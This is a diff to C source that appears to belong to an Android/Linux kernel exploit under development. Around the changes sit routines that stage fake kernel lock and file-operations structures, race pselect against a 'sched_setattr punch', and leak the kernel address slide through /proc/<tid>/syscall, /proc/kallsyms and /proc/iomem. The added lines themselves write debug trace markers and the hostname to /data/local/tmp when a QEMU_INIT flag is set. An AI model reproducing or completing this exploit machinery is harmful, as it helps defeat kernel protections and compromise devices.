@@ -1536,7 +1536,7 @@ void do_pselect_fake_lock_route(void) {
      * Route success will stay 0; goal is survive select.
      */
     if (env_flag("MODE4_NO_CONSUMER", 0)) {
-      atomic_store(&punch_consume_go, 0);
+    atomic_store(&punch_consume_go, 0);
       pr_info("pselect NO_CONSUMER=1 (no sched_setattr punch; survive-test)\n");
     } else {
       atomic_store(&punch_consume_go, route_attempt);
@@ -1929,7 +1929,20 @@ int selfstamp_prestage(void) {
   return 0;
 }
 
+static void ss_flow(const char *m) {
+  if (!env_flag("QEMU_INIT", 0))
+    return;
+  int f = open("/data/local/tmp/flow", O_WRONLY | O_CREAT | O_APPEND | O_SYNC,
+               0644);
+  if (f >= 0) {
+    (void)write(f, m, strlen(m));
+    (void)write(f, "\n", 1);
+    close(f);
+  }
+}
+
 void selfstamp_route(void) {
+  ss_flow("ss_route_enter");
   if (!page_base || !fake_lock || !fake_fops) {
     pr_error("selfstamp route missing kernel page\n");
     return;
@@ -1968,6 +1981,7 @@ void selfstamp_route(void) {
       }
     }
     atomic_store(&punch_consume_go, ph);
+    ss_flow("ss_phase_armed");
     durable_proof_log("ss_phase_armed");
     if (env_flag("QEMU_INIT", 0)) {
       /* /proc/<tid>/syscall exposes the waiter's kernel SP while blocked
@@ -2045,6 +2059,17 @@ void selfstamp_route(void) {
      * even a partial dump that survives the crash yields the slide.
      */
     {
+      {
+        char hn[80] = {0};
+        read_first_line("/proc/sys/kernel/hostname", hn, sizeof(hn));
+        int hf = open("/data/local/tmp/hostname_readback",
+                      O_WRONLY | O_CREAT | O_TRUNC | O_SYNC, 0644);
+        if (hf >= 0) {
+          if (hn[0]) (void)write(hf, hn, strlen(hn));
+          close(hf);
+        }
+        pr_info("SS_HOSTNAME=[%.60s]\n", hn);
+      }
       const char *srcs[] = {"/proc/kallsyms", "/proc/iomem"};
       for (size_t si = 0; si < 2; si++) {
         int in = open(srcs[si], O_RDONLY | O_CLOEXEC);
